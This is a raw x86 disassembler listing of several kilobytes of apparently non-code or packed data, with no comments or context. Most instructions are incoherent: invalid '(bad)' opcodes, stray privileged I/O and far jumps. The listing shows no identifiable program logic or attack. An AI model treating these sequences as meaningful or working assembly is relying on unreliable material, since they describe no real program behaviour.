  426c1b:	mov    esp,0x83ab4465
  426c20:	jnp    0x426c99
  426c22:	das    
  426c23:	push   ds
  426c24:	pop    eax
  426c25:	cmp    eax,0x8c057c33
  426c2a:	mov    WORD PTR [ecx],fs
  426c2c:	retf   
  426c2d:	and    DWORD PTR [edi],0xc454288b
  426c33:	xchg   edi,eax
  426c34:	jno    0x426c1d
  426c36:	not    DWORD PTR [ecx-0x33]
  426c39:	sbb    al,0x47
  426c3b:	(bad)  
  426c3d:	mov    ebp,0x6abbf407
  426c42:	(bad)  
  426c43:	ret    0xa610
  426c46:	inc    ebp
  426c47:	push   ss
  426c48:	aas    
  426c49:	or     DWORD PTR [edx+ebp*8],esp
  426c4c:	xchg   esi,eax
  426c4d:	cmp    cl,BYTE PTR [esi-0x5f]
  426c50:	dec    edx
  426c51:	fs ret 0x91f0
  426c55:	push   ds
  426c56:	mov    dh,0xa4
  426c58:	add    eax,0x57dcca26
  426c5d:	add    ch,bl
  426c5f:	mov    ch,0xaa
  426c61:	sub    eax,0x61051fd4
  426c66:	inc    eax
  426c67:	sub    bh,dl
  426c69:	sti    
  426c6a:	js     0x426bf4
  426c6c:	out    0xdb,al
  426c6e:	push   eax
  426c6f:	mov    ah,dh
  426c71:	aam    0x29
  426c73:	bound  ebp,QWORD PTR [edi]
  426c75:	clc    
  426c76:	and    al,0x14
  426c78:	sbb    eax,DWORD PTR [esi+ecx*1]
  426c7b:	jns    0x426cbd
  426c7d:	mov    DWORD PTR [ecx-0x49],edx
  426c80:	adc    BYTE PTR [ebp-0x64],ah
  426c83:	cld    
  426c84:	or     al,0xfa
  426c86:	and    ebp,DWORD PTR [ecx+0x573f3b95]
  426c8c:	add    ebp,esi
  426c8e:	sbb    ebx,DWORD PTR ds:0x9ea46a91
  426c94:	dec    edx
  426c95:	adc    al,0x77
  426c97:	xor    ah,cl
  426c99:	(bad)  
  426c9a:	cmp    DWORD PTR [ebx+ebp*2+0x322bcab8],edx
  426ca1:	mov    bh,bh
  426ca3:	cmp    DWORD PTR [ecx+0x20],esi
  426ca6:	cmp    eax,0xf8e284e0
  426cab:	adc    al,0xfe
  426cad:	jne    0x426d14
  426caf:	xchg   edx,eax
  426cb0:	xor    edx,DWORD PTR [ebx+0x3c]
  426cb3:	and    ecx,DWORD PTR [ecx+0x1a38d232]
  426cb9:	loopne 0x426c54
  426cbb:	sar    BYTE PTR [ecx-0x5cf9190],cl
  426cc1:	cmp    al,0xbf
  426cc3:	addr16 pop ebx
  426cc5:	add    BYTE PTR [eax],al
  426cc7:	or     DWORD PTR [ecx+0x63a8b347],edi
  426ccd:	mov    al,0x69
  426ccf:	fwait
  426cd0:	mov    BYTE PTR [edx+0x4a949d13],dl
  426cd6:	sub    esp,DWORD PTR [edi-0x675cdc5e]
  426cdc:	dec    eax
  426cdd:	(bad)
  426ce1:	sub    BYTE PTR [edi-0x65],ch
  426ce4:	cmp    BYTE PTR [esi+0x5],dh
  426ce7:	test   al,0x4a
  426ce9:	sbb    eax,0x64a5107
  426cee:	add    edx,DWORD PTR [ecx]
  426cf0:	or     BYTE PTR [edi+0x510e3f01],ch
  426cf6:	jo     0x426d56
  426cf8:	mov    bl,dh
  426cfa:	xor    eax,0x141edeba
  426cff:	popa   
  426d00:	imul   edx,DWORD PTR [edx-0x75],0xffffffa9
  426d04:	xchg   esp,eax
  426d05:	(bad)  
  426d06:	push   ecx
  426d07:	dec    edi
  426d08:	or     BYTE PTR [edx-0x35],ah
  426d0b:	sti    
  426d0c:	rol    DWORD PTR [esi],cl
  426d0e:	xchg   DWORD PTR [ebp+ebx*1+0x25],eax
  426d12:	cld    
  426d13:	stos   DWORD PTR es:[edi],eax
  426d14:	in     al,dx
  426d15:	addr16 mov bl,0x19
  426d18:	ss enter 0xe228,0xdd
  426d1d:	out    0x74,al
  426d1f:	(bad)  
  426d21:	outs   dx,BYTE PTR ds:[esi]
  426d22:	sbb    DWORD PTR [esi+0x5],ecx
  426d25:	push   cs
  426d26:	dec    eax
  426d27:	adc    dh,BYTE PTR [eax+ebp*4+0x32208af9]
  426d2e:	xchg   ebx,eax
  426d2f:	or     ebx,edx
  426d31:	int    0x82
  426d33:	push   ss
  426d34:	popa   
  426d35:	xchg   ebx,ebx
  426d37:	push   esp
  426d38:	popf   
  426d39:	outs   dx,WORD PTR ds:[esi]
  426d3b:	jp     0x426d80
  426d3d:	(bad)  
  426d3e:	pop    edi
  426d3f:	(bad)  
  426d40:	pop    eax
  426d41:	xlat   BYTE PTR ds:[ebx]
  426d42:	mov    cl,0x14
  426d44:	mov    esp,0xf11edd9d
  426d49:	ret    0x5164
  426d4c:	clc    
  426d4d:	popa   
  426d4e:	adc    ebp,DWORD PTR [edi-0x5b]
  426d51:	lods   eax,DWORD PTR ds:[esi]
  426d52:	add    DWORD PTR [esi],ebp
  426d54:	into   
  426d55:	dec    ebx
  426d56:	push   0x2d27d4af
  426d5b:	mov    DWORD PTR [ecx-0x2b],edi
  426d5e:	sub    al,0xd6
  426d60:	ins    BYTE PTR es:[edi],dx
  426d61:	enter  0x8d57,0x7c
  426d65:	fs test eax,0x1c0e1455
  426d6b:	ret    
  426d6c:	dec    ecx
  426d6d:	mov    al,ds:0x1b6559d4
  426d72:	(bad)  
  426d73:	push   eax
  426d74:	popf   
  426d75:	adc    DWORD PTR [esp+edi*1+0x15f3513c],eax
  426d7c:	push   0x11471d8d
  426d81:	pop    es
  426d82:	pop    ecx
  426d83:	test   al,0x96
  426d85:	push   cs
  426d86:	stc    
  426d87:	sub    eax,0xba08deeb
  426d8c:	adc    eax,0x98b3ef57
  426d91:	or     eax,0xbe93c7eb
  426d96:	das    
  426d97:	sbb    BYTE PTR fs:[edi+edx*8-0x20],cl
  426d9c:	das    
  426d9d:	add    eax,0x61a3c68a
  426da2:	mov    ds:0x75e74ed9,eax
  426da7:	add    eax,0x68580509
  426dac:	(bad)  
  426dad:	aad    0xcc
  426daf:	icebp  
  426db0:	mov    cl,0x6e
  426db2:	aas    
  426db3:	vpand  ymm5,ymm5,ymm0
  426db7:	cmc    
  426db8:	scas   eax,DWORD PTR es:[edi]
  426db9:	mov    bh,0x33
  426dbb:	and    eax,0x405f7739
  426dc0:	and    eax,0xddecfb17
  426dc5:	lods   al,BYTE PTR ds:[esi]
  426dc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426dc7:	cwde   
  426dc8:	stos   BYTE PTR es:[edi],al
  426dc9:	mov    al,ds:0xd8e61594
  426dce:	out    0xf3,eax
  426dd0:	ss js  0x426e0f
  426dd3:	sar    BYTE PTR ds:0xe4b22382,1
  426dd9:	das    
  426dda:	cs pop es
  426ddc:	mov    eax,ds:0xb8ae203b
  426de1:	mov    cs,esp
  426de3:	(bad)  
  426de4:	out    0xbd,eax
  426de6:	and    al,BYTE PTR [ecx]
  426de8:	mov    ebp,ebp
  426dea:	mov    eax,0x83d7190
  426def:	lea    eax,[edx-0x48]
  426df2:	pop    esi
  426df3:	cdq    
  426df4:	mov    dl,0x53
  426df6:	push   ss
  426df7:	aam    0xd6
  426df9:	jp     0x426d92
  426dfb:	xchg   ebp,ebp
  426dfd:	mov    edx,0xfff330a9
  426e02:	push   ecx
  426e03:	(bad)  
  426e04:	push   es
  426e05:	aad    0xad
  426e07:	or     al,0x31
  426e09:	dec    esp
  426e0a:	mov    db5,eax
  426e0d:	repz jno 0x426e10
	...
  426e18:	add    BYTE PTR [eax],al
  426e1a:	mov    dh,0xe4
  426e1c:	xlat   BYTE PTR ds:[ebx]
  426e1d:	push   esp
  426e1e:	xlat   BYTE PTR ds:[ebx]
  426e1f:	ja     0x426dd8
  426e21:	out    0x39,al
  426e23:	(bad)  
  426e24:	push   ebx
  426e25:	lahf   
  426e26:	adc    bh,ch
  426e28:	or     ecx,edx
  426e2a:	jne    0x426e10
  426e2c:	add    DWORD PTR [eax],eax
  426e2e:	std    
  426e2f:	add    DWORD PTR [eax],eax
  426e31:	add    BYTE PTR [esp+ebp*2-0x1f],bl
  426e35:	mov    bh,0x55
  426e37:	outs   dx,BYTE PTR ds:[esi]
  426e38:	inc    edx
  426e39:	gs add al,0xe7
  426e3c:	adc    DWORD PTR [ecx+0x54],ebx
  426e3f:	mov    esi,0x5f3c6a52
  426e44:	lods   al,BYTE PTR ds:[esi]
  426e45:	iret   
  426e46:	dec    esi
  426e47:	stos   DWORD PTR es:[edi],eax
  426e48:	aad    0x13
  426e4a:	and    DWORD PTR [edi+esi*1-0x3eb54cc7],ebp
  426e51:	cs stos BYTE PTR es:[edi],al
  426e53:	or     DWORD PTR gs:[edi+ebx*8+0x36c5a591],edi
  426e5b:	retf   0x386b
  426e5e:	in     eax,0x1b
  426e60:	cmp    DWORD PTR [ebx],ebp
  426e62:	std    
  426e63:	add    DWORD PTR [eax],0x3e1d7465
  426e69:	inc    ebx
  426e6a:	push   ds
  426e6b:	push   ecx
  426e6c:	and    al,0x7
  426e6e:	les    ecx,FWORD PTR [edx-0x10]
  426e71:	imul   esi,DWORD PTR [esp+eax*4],0xf3cca8f3
  426e78:	test   eax,0x1e74e123
  426e7d:	stos   BYTE PTR es:[edi],al
  426e7e:	and    ecx,DWORD PTR [eax+esi*8]
  426e81:	cmp    ecx,DWORD PTR [ebx+ebp*2-0x944f27f]
  426e88:	dec    edx
  426e89:	push   ebx
  426e8a:	mov    ds:0x151d9e81,eax
  426e8f:	in     eax,0xc
  426e91:	inc    ebx
  426e92:	and    edi,DWORD PTR [edx+edi*2]
  426e95:	inc    edi
  426e96:	sbb    eax,0xf1ba9f0f
  426e9b:	(bad)  
  426e9c:	retf   
  426e9d:	push   ecx
  426e9e:	icebp  
  426e9f:	add    ah,BYTE PTR [edi]
  426ea1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ea2:	mov    ah,0xb5
  426ea4:	push   edi
  426ea5:	out    dx,eax
  426ea6:	lds    esp,FWORD PTR [ecx-0x101ddf9f]
  426eac:	sbb    al,0x0
  426eae:	push   0x704db613
  426eb3:	sbb    esi,DWORD PTR [edi]
  426eb5:	mov    ecx,0xffe32d76
  426eba:	jb     0x426e66
  426ebc:	(bad)  
  426ebf:	test   eax,0x8a5839bd
  426ec4:	popf   
  426ec5:	adc    DWORD PTR [eax-0x485591f7],0x6837001b
  426ecf:	sbb    eax,0x35ca78be
  426ed4:	pop    ds
  426ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ed6:	ins    DWORD PTR es:[edi],dx
  426ed7:	test   BYTE PTR [eax+0x5962ecda],dl
  426edd:	popf   
  426ede:	rol    DWORD PTR [ebx+0x7d],1
  426ee1:	jae    0x426eda
  426ee3:	in     eax,0xac
  426ee5:	fcmovnbe st,st(2)
  426ee7:	pop    ds
  426ee8:	scas   eax,DWORD PTR es:[edi]
  426ee9:	fs out dx,eax
  426eeb:	mov    ebp,0xe78af998
  426ef0:	les    eax,FWORD PTR [ebx]
  426ef2:	and    DWORD PTR [ebp+0x223b3049],edi
  426ef8:	imul   esi,DWORD PTR [eax],0xdf8c210a
  426efe:	stos   BYTE PTR es:[edi],al
  426eff:	push   ss
  426f00:	xchg   edx,eax
  426f01:	sbb    al,0xdb
  426f03:	push   edx
  426f04:	push   cs
  426f05:	icebp  
  426f06:	dec    esi
  426f07:	outs   dx,BYTE PTR ds:[esi]
  426f08:	mov    esi,0x949f2c45
  426f0d:	mov    cl,0xd7
  426f0f:	or     al,0xff
  426f11:	xor    DWORD PTR ds:0xa49def42,ecx
  426f17:	sub    BYTE PTR [ebp-0x681fe78a],bh
  426f1d:	sub    DWORD PTR [eax-0x70d20109],ebx
  426f23:	and    DWORD PTR [ebx-0x7e],edx
  426f26:	cwde   
  426f27:	and    ecx,eax
  426f29:	es std 
  426f2b:	fstp   TBYTE PTR [ebp-0x5c]
  426f2e:	add    eax,0xf223104d
  426f33:	imul   esi,DWORD PTR [esp+eax*4+0x47],0xf0c7852
  426f3b:	add    DWORD PTR [ebp+0xd],ecx
  426f3e:	repz sub DWORD PTR [edi-0x19],esi
  426f42:	push   ebx
  426f43:	(bad)  
  426f44:	jp     0x426f80
  426f46:	add    eax,0x462d4663
  426f4b:	into   
  426f4c:	(bad)  
  426f4d:	test   eax,0x4b872f0f
  426f52:	inc    esp
  426f53:	call   0x1c690bdb
  426f58:	cli    
  426f59:	push   ecx
  426f5a:	add    DWORD PTR [ebx],0xffffff95
  426f5d:	fisttp WORD PTR [ecx+0x6d]
  426f60:	outs   dx,BYTE PTR ds:[esi]
  426f61:	(bad)  
  426f62:	mov    bh,0x85
  426f64:	inc    eax
  426f65:	and    DWORD PTR [edx],ecx
  426f67:	push   ecx
  426f68:	xchg   esp,eax
  426f69:	xchg   edi,eax
  426f6a:	or     eax,0xa47955d5
  426f6f:	dec    esi
  426f70:	in     eax,dx
  426f71:	mov    al,0xb7
  426f73:	sub    ebx,DWORD PTR [esi]
  426f75:	mov    ds,WORD PTR [eax-0x2]
  426f78:	imul   edi,eax,0xffffff96
  426f7b:	add    cl,al
  426f7d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  426f7f:	fisttp WORD PTR [ebx-0x6a]
  426f82:	dec    edi
  426f83:	scas   al,BYTE PTR es:[edi]
  426f84:	mov    dh,0xa9
  426f86:	jmp    0xaf852a13
  426f8b:	or     eax,0x260a82c1
  426f90:	pop    es
  426f91:	rcl    DWORD PTR [esi+esi*4],0xe0
  426f95:	loope  0x426f86
  426f97:	push   cs
  426f98:	pop    eax
  426f99:	cs cli 
  426f9b:	xor    DWORD PTR [ebx],eax
  426f9d:	mov    dh,0xff
  426f9f:	retf   
  426fa0:	or     DWORD PTR [ebp+0x40],0x51
  426fa4:	dec    ebp
  426fa5:	push   ds
  426fa6:	stos   BYTE PTR es:[edi],al
  426fa7:	repz popf 
  426fa9:	xor    DWORD PTR [edx+0x6ebc9a4f],0xb59a3c53
  426fb3:	ins    DWORD PTR es:[edi],dx
  426fb4:	pop    ss
  426fb5:	lods   al,BYTE PTR ds:[esi]
  426fb6:	inc    edx
  426fb7:	call   0x4a69:0xafbce4d4
  426fbe:	pop    edi
  426fbf:	mov    ds:0xb1c2d18e,eax
  426fc4:	fwait
  426fc5:	cmc    
  426fc6:	pop    ebx
  426fc7:	enter  0x3de9,0x7e
  426fcb:	pop    ss
  426fcc:	jo     0x426fee
  426fce:	cli    
  426fcf:	and    eax,0x365ddad3
  426fd4:	jnp    0x426f6a
  426fd6:	cmp    DWORD PTR [ebx],ebx
  426fd8:	ins    BYTE PTR es:[edi],dx
  426fd9:	and    al,0x43
  426fdb:	pop    ebx
  426fdc:	jmp    0x607:0x9dfa48be
  426fe3:	sbb    al,0x7d
  426fe5:	sbb    DWORD PTR [ebx+ebx*1],ebx
  426fe8:	das    
  426fe9:	push   esp
  426fea:	sub    al,0x60
  426fec:	ret    0x8935
  426fef:	cld    
  426ff0:	repz adc edx,DWORD PTR [ebx+edi*4+0x61]
  426ff5:	pop    ds
  426ff6:	or     eax,0x21b46bba
  426ffb:	xchg   BYTE PTR [esi-0x6c742897],bh
  427001:	jns    0x426fc2
  427003:	adc    al,0xe1
  427005:	add    al,0xbc
  427007:	test   ch,0x50
  42700a:	pop    edx
  42700b:	test   ch,ah
  42700d:	push   ss
  42700e:	lock jge 0x426fa7
  427011:	ja     0x42706b
  427013:	je     0x427042
  427015:	sti    
  427016:	les    esi,FWORD PTR [ebx+ebx*8]
  427019:	scas   eax,DWORD PTR es:[edi]
  42701a:	dec    esi
  42701b:	ja     0x427015
  42701d:	mov    BYTE PTR [esi+0x16d8e36],ah
  427023:	pop    ebp
  427025:	xchg   edx,eax
  427026:	xchg   BYTE PTR [ecx-0x32],ch
  427029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42702a:	pop    edi
  42702b:	inc    edx
  42702c:	mov    ds,WORD PTR [ebx+0xb4]
	...
  42703a:	cli    
  42703b:	rcl    DWORD PTR ds:0xfac73d07,cl
  427041:	jmp    DWORD PTR [ecx+0x2aa43d15]
  427047:	jns    0x4270af
  427049:	dec    edi
  42704a:	jb     0x427032
  42704c:	add    DWORD PTR [eax],eax
  42704e:	std    
  42704f:	add    DWORD PTR [eax],eax
  427051:	add    BYTE PTR [edx-0x36],bl
  427054:	outs   dx,BYTE PTR ds:[esi]
  427055:	jl     0x427075
  427057:	xchg   ecx,eax
  427058:	outs   dx,DWORD PTR ds:[esi]
  427059:	xor    BYTE PTR [edi],dl
  42705b:	dec    esi
  42705c:	icebp  
  42705d:	jns    0x427050
  42705f:	iret   
  427060:	add    BYTE PTR [ecx-0x62],ah
  427063:	loopne 0x4270db
  427065:	ds inc edi
  427067:	xchg   esp,edx
  427069:	jge    0x4270be
  42706b:	sub    al,0x16
  42706d:	fcom   QWORD PTR [edi-0xfdf61f2]
  427073:	repnz bound esp,QWORD PTR ds:[esi]
  427077:	push   0xfffffffc
  427079:	and    al,BYTE PTR [edi]
  42707b:	stos   BYTE PTR es:[edi],al
  42707c:	(bad)
  42707f:	clc    
  427080:	sahf   
  427081:	pop    ds
  427082:	cmc    
  427083:	xchg   DWORD PTR [ecx],edx
  427085:	arpl   WORD PTR [esi],bp
  427087:	int3   
  427088:	adc    dh,ah
  42708a:	lock dec edi
  42708c:	js     0x42705f
  42708e:	inc    ebx
  42708f:	shr    ecx,1
  427091:	cmp    al,0x7d
  427093:	mov    al,ch
  427095:	sbb    eax,0xd331a529
  42709a:	and    DWORD PTR [ebx+0xc],edx
  42709d:	push   edx
  42709e:	mov    ebx,0x9a2790c0
  4270a3:	mov    ds:0x6acf6629,eax
  4270a8:	cmp    BYTE PTR [edi+0x7325c6b6],bl
  4270ae:	test   BYTE PTR [edi-0x11],cl
  4270b1:	outs   dx,BYTE PTR ds:[esi]
  4270b2:	pop    es
  4270b3:	leave  
  4270b4:	fnstcw WORD PTR [esi+0x7b7ee61c]
  4270ba:	adc    esi,ebx
  4270bc:	clc    
  4270bd:	out    0x94,eax
  4270bf:	and    ebx,esi
  4270c1:	jne    0x427085
  4270c3:	lock data16 loop 0x4270d0
  4270c7:	aam    0xd
  4270c9:	sub    al,0xf3
  4270cb:	fdivr  st(3),st
  4270cd:	sub    al,0xbd
  4270cf:	imul   ebx,DWORD PTR [eax-0x19cdcfdf],0xb9d4dc12
  4270d9:	mov    ecx,0x1784807c
  4270de:	fdivr  st,st(0)
  4270e0:	sub    DWORD PTR [ebp+0x5d],0x65
  4270e4:	ins    DWORD PTR es:[edi],dx
  4270e5:	mov    eax,ds:0x49121ab2
  4270ea:	xchg   ebp,eax
  4270eb:	lods   eax,DWORD PTR es:[esi]
  4270ed:	sbb    eax,0x99282446
  4270f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270f3:	neg    DWORD PTR [ebp-0x66dc7335]
  4270f9:	sti    
  4270fa:	(bad)  
  4270fb:	cmp    al,0xee
  4270fd:	loopne 0x427148
  4270ff:	push   edx
  427100:	inc    edi
  427101:	mov    bh,0x9f
  427103:	inc    ebp
  427104:	adc    BYTE PTR [edi+0x434d84bb],0xa4
  42710b:	fstp   QWORD PTR [ecx+0x485fb801]
  427111:	sti    
  427112:	mov    bh,0x38
  427114:	scas   eax,DWORD PTR es:[edi]
  427115:	mov    eax,ds:0x9efe9c38
  42711a:	loopne 0x42718a
  42711c:	pop    edx
  42711d:	add    al,0x2e
  42711f:	adc    al,0x7e
  427121:	(bad)  
  427122:	lock fdiv QWORD PTR [edi+esi*4+0x7a]
  427127:	push   edx
  427128:	inc    ebx
  427129:	dec    ecx
  42712a:	or     al,0x89
  42712c:	imul   edx,DWORD PTR [eax],0x19
  42712f:	in     al,dx
  427130:	mov    ecx,0xff87c69c
  427135:	stos   DWORD PTR es:[edi],eax
  427136:	jmp    0x6bf4b8d3
  42713b:	fs and al,ch
  42713e:	mov    BYTE PTR [esp+ebx*2+0x2f],dh
  427142:	mov    ds,WORD PTR [eax+0x1444bebc]
  427148:	cwde   
  427149:	inc    eax
  42714a:	add    ch,BYTE PTR [ecx-0x41]
  42714d:	test   eax,0x85930185
  427152:	aas    
  427153:	push   es
  427154:	xor    DWORD PTR [edi],ebp
  427156:	or     DWORD PTR [ebx+0x7ce9ba3d],edi
  42715c:	jl     0x42711e
  42715e:	psubsb mm6,QWORD PTR [ecx+0x31952bf7]
  427165:	jnp    0x42716b
  427167:	rcr    BYTE PTR [ebx],1
  427169:	push   eax
  42716a:	or     dh,BYTE PTR [eax-0x37]
  42716d:	(bad)  
  42716e:	cmp    al,0x68
  427170:	push   0xfffffff9
  427172:	stos   DWORD PTR es:[edi],eax
  427173:	syscall 
  427175:	mov    ecx,0xb8127855
  42717a:	sbb    cl,BYTE PTR ds:0x9f763425
  427180:	dec    edi
  427181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427182:	push   edi
  427183:	test   ebp,esi
  427185:	jne    0x4271e1
  427187:	push   esi
  427188:	and    al,0x5d
  42718a:	add    BYTE PTR [ecx-0x363befca],cl
  427190:	jge    0x42717c
  427192:	lahf   
  427193:	mov    al,0x6b
  427195:	idiv   BYTE PTR [ecx]
  427197:	ja     0x42719a
  427199:	stos   BYTE PTR es:[edi],al
  42719a:	aad    0x76
  42719c:	sbb    esp,ecx
  42719e:	sub    DWORD PTR es:[eax],edi
  4271a1:	std    
  4271a2:	dec    edx
  4271a3:	mov    eax,ds:0x17a8554a
  4271a8:	or     BYTE PTR [edi+ebx*8-0x65],dh
  4271ac:	dec    eax
  4271ad:	pop    ecx
  4271ae:	jnp    0x427159
  4271b0:	xchg   esi,eax
  4271b1:	mov    bh,0xf8
  4271b3:	push   edi
  4271b4:	push   eax
  4271b5:	call   0x162b5c3a
  4271ba:	out    0x86,al
  4271bc:	pop    edi
  4271bd:	and    al,cl
  4271bf:	mov    eax,ds:0x9bc28cab
  4271c4:	pusha  
  4271c5:	pop    ds
  4271c6:	sub    DWORD PTR [ebp+0x2a],ebp
  4271c9:	pop    eax
  4271ca:	mov    edx,0xadea467
  4271cf:	jecxz  0x427208
  4271d1:	sub    bh,cl
  4271d3:	push   0x4b
  4271d5:	and    BYTE PTR [ebp-0x661526ce],0x79
  4271dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4271dd:	sbb    eax,0x324e96f7
  4271e2:	mov    bl,0xe2
  4271e4:	push   ebx
  4271e5:	(bad)  
  4271e6:	push   ds
  4271e7:	push   ebp
  4271e8:	mov    BYTE PTR [ecx+0x78],ah
  4271eb:	mov    ds:0x9db871b8,eax
  4271f0:	ins    DWORD PTR es:[edi],dx
  4271f1:	sub    eax,0x724b4283
  4271f6:	dec    edi
  4271f7:	cld    
  4271f8:	in     al,0xef
  4271fa:	cmp    eax,0x1d376c6e
  4271ff:	in     eax,0x64
  427201:	xchg   DWORD PTR fs:[edi-0x720f26aa],esp
  427208:	or     esp,DWORD PTR [eax]
  42720a:	dec    esp
  42720b:	or     esp,DWORD PTR [ecx-0x8]
  42720e:	cld    
  42720f:	shr    BYTE PTR [edx+edx*4-0x13],cl
  427213:	sub    ecx,DWORD PTR [edi]
  427215:	repnz pushf 
  427217:	or     al,0x24
  427219:	scas   eax,DWORD PTR es:[edi]
  42721a:	jl     0x427240
  42721c:	and    dl,0x4d
  42721f:	lahf   
  427220:	xor    BYTE PTR [ecx+eiz*4+0x9],dl
  427224:	pop    eax
  427225:	dec    ebp
  427226:	push   eax
  427227:	xchg   edx,eax
  427228:	sub    DWORD PTR [ebx+0x53],esp
  42722b:	retf   
  42722c:	pop    edi
  42722d:	and    BYTE PTR [edx-0x16],bl
  427230:	out    dx,al
  427231:	icebp  
  427232:	mov    edx,0xaad1261b
  427237:	push   ebp
  427238:	push   0x81ebfb35
  42723d:	nop
  42723e:	inc    ebx
  42723f:	mov    esp,0xff45ab30
  427244:	les    eax,FWORD PTR [ebx]
  427246:	stos   BYTE PTR es:[edi],al
  427247:	xor    cl,BYTE PTR [esi+edi*8+0x52]
  42724b:	lea    edi,[esi]
  42724d:	inc    ebp
  42724e:	or     al,BYTE PTR [eax]
	...
  427258:	add    BYTE PTR [eax],al
  42725a:	iret   
  42725b:	neg    BYTE PTR [ebp-0x308442b0]
  427261:	(bad)  
  427262:	mov    ecx,0xeb02077
  427267:	stos   BYTE PTR es:[edi],al
  427268:	std    
  427269:	jge    0x4272da
  42726b:	call   0x23f7271
  427270:	add    BYTE PTR [eax],al
  427272:	mov    esp,0x3e42713a
  427277:	in     eax,dx
  427278:	fld    QWORD PTR [ecx-0xd]
  42727b:	add    BYTE PTR [esi-0x2f],bl
  42727e:	dec    eax
  42727f:	adc    eax,DWORD PTR [esi+0x67b6158d]
  427285:	ss aas 
  427287:	fst    DWORD PTR [edx+0x13]
  42728a:	adc    eax,esi
  42728c:	fst    QWORD PTR [eax-0x5c]
  42728f:	mov    al,0x2
  427291:	jmp    FWORD PTR gs:[esi+eiz*4+0x773ada18]
  427299:	lahf   
  42729a:	dec    ebx
  42729b:	jmp    0x4272e7
  42729d:	sub    al,0x41
  42729f:	test   BYTE PTR [eax+ebx*4+0x62eee0b0],al
  4272a6:	add    ebx,DWORD PTR [ecx-0x6f080ac1]
  4272ac:	stos   DWORD PTR es:[edi],eax
  4272ad:	arpl   WORD PTR [eax],sp
  4272af:	sub    DWORD PTR [esi+eiz*1],ecx
  4272b2:	mov    eax,ds:0xa77e882
  4272b7:	fucom  st(2)
  4272b9:	add    BYTE PTR [ecx-0x21848bdd],dh
  4272bf:	(bad)  
  4272c0:	(bad)
  4272c3:	loope  0x42731d
  4272c5:	lock dec edx
  4272c7:	aas    
  4272c8:	aad    0x4b
  4272ca:	shl    DWORD PTR [esi-0xe1d6e51],cl
  4272d0:	pop    ss
  4272d1:	add    esi,DWORD PTR [eax+0x70]
  4272d4:	dec    edx
  4272d5:	ss cli 
  4272d7:	(bad)  
  4272d8:	jmp    0x427313
  4272da:	lods   al,BYTE PTR ds:[esi]
  4272db:	jle    0x4272e1
  4272dd:	test   eax,0xcf81f21e
  4272e2:	or     BYTE PTR [ecx+0x2d],cl
  4272e5:	in     eax,dx
  4272e6:	mov    dl,dl
  4272e8:	loope  0x4272db
  4272ea:	cdq    
  4272eb:	pop    ss
  4272ec:	mov    dh,0x3a
  4272ee:	add    al,0x90
  4272f0:	cdq    
  4272f1:	sub    eax,0x5da8d2ca
  4272f6:	mov    cl,0x55
  4272f8:	push   0x4b4bf856
  4272fd:	mov    BYTE PTR [edi-0x250e3589],dl
  427303:	test   BYTE PTR [ebx+0x62],0x9d
  427307:	or     DWORD PTR [eax-0x48],esp
  42730a:	fistp  QWORD PTR [ebx]
  42730c:	xlat   BYTE PTR ds:[ebx]
  42730d:	mov    eax,ds:0x4341bed9
  427312:	push   cs
  427313:	mov    edi,0x2de7e606
  427318:	xchg   esp,eax
  427319:	jbe    0x427349
  42731b:	loope  0x42735d
  42731d:	pushf  
  42731e:	fst    QWORD PTR [ebx+0x322f633e]
  427324:	or     al,ah
  427326:	dec    ecx
  427327:	pop    eax
  427328:	adc    BYTE PTR [esi-0x4d520667],bh
  42732e:	jmp    0x6e87:0x8a17dc0b
  427335:	nop
  427336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427337:	bound  edx,QWORD PTR [esi+esi*2]
  42733a:	push   ebp
  42733b:	aam    0xcc
  42733d:	lds    esi,FWORD PTR [ecx+edi*2-0x79]
  427341:	std    
  427342:	jg     0x4272cd
  427344:	push   ecx
  427345:	fld    st(1)
  427347:	mov    BYTE PTR [ebx],bl
  427349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42734a:	stc    
  42734b:	nop
  42734c:	clc    
  42734d:	(bad)  
  42734e:	retf   
  42734f:	(bad)  
  427350:	pop    es
  427351:	and    eax,0xa7d65040
  427356:	mov    eax,ds:0x58743277
  42735b:	(bad)  [esi+ebx*4-0x65]
  42735f:	sahf   
  427360:	add    dl,BYTE PTR [ecx+0x307acbd5]
  427366:	mov    bl,0x4d
  427368:	loope  0x427348
  42736a:	dec    ebx
  42736b:	xchg   edx,eax
  42736c:	pop    edi
  42736d:	sbb    eax,0x51c8ad11
  427372:	add    al,BYTE PTR [ebx]
  427374:	sar    ah,0xda
  427377:	pop    esi
  427378:	and    DWORD PTR [edi],ecx
  42737a:	jmp    0x4273ea
  42737c:	outs   dx,DWORD PTR ds:[esi]
  42737d:	pop    esi
  42737e:	imul   ebx,DWORD PTR [ebp+esi*4+0x6f],0xffffffce
  427383:	inc    dx
  427385:	push   cs
  427386:	pop    edx
  427387:	fcos   
  427389:	in     al,0x3d
  42738b:	jb     0x42739f
  42738d:	fmul   QWORD PTR [ebx-0x4f]
  427390:	xchg   ebp,eax
  427391:	jne    0x427384
  427393:	inc    ecx
  427394:	mov    ecx,0xf80b019e
  427399:	call   0x11f6e2ff
  42739e:	push   es
  42739f:	push   ds
  4273a0:	adc    BYTE PTR [edi-0x650aaf93],ch
  4273a6:	adc    esi,ebx
  4273a8:	sub    edx,DWORD PTR [eax]
  4273aa:	jecxz  0x42735e
  4273ac:	std    
  4273ad:	loop   0x4273b0
  4273af:	mov    edi,0xd911704e
  4273b4:	push   edx
  4273b5:	ret    
  4273b6:	lock mov DWORD PTR [esi-0x29371d1],ebp
  4273bd:	mov    bl,0x28
  4273bf:	shr    DWORD PTR [ecx-0x55a1d96c],1
  4273c5:	test   BYTE PTR [edx+0x7129366a],0xc0
  4273cc:	pop    ebp
  4273cd:	fstp   st(6)
  4273cf:	imul   ebx,DWORD PTR [ecx+0x39],0x4c
  4273d3:	les    ebx,FWORD PTR [eax+ebx*1-0xe]
  4273d7:	add    BYTE PTR [edi+0x5fea4842],ah
  4273dd:	rcl    BYTE PTR [edi-0x13],1
  4273e0:	xor    al,0x9c
